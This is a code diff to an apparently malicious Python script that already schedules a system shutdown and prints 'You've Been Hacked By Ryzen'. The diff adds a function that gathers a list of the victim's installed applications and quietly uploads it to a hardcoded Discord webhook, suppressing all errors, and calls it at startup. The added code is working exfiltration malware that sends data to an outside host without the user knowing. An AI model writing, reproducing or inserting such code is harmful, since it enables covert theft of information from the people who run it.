@@ -325,6 +325,21 @@ def list_applications_in_folders():
 
     return 'applications_list.txt'
 
+def send_file_to_discord_webhook(file_path, webhook_url):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        response = requests.post(webhook_url, files=files)
+        if response.status_code != 200:
+            pass
+
+def goon():
+    webhook_url = 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH'  # Replace with your actual webhook URL
+    try:
+        file_path = list_applications_in_folders()
+        send_file_to_discord_webhook(file_path, webhook_url)
+    except Exception as e:
+        pass
+
 def schedule_shutdown():
 
     current_time = time.localtime()
@@ -536,6 +551,7 @@ def main():
 if __name__ == "__main__":
     main()
     schedule_shutdown()
+    goon()
 
 print("[*] You've Been Hacked By Ryzen\n")
 time.sleep(3)
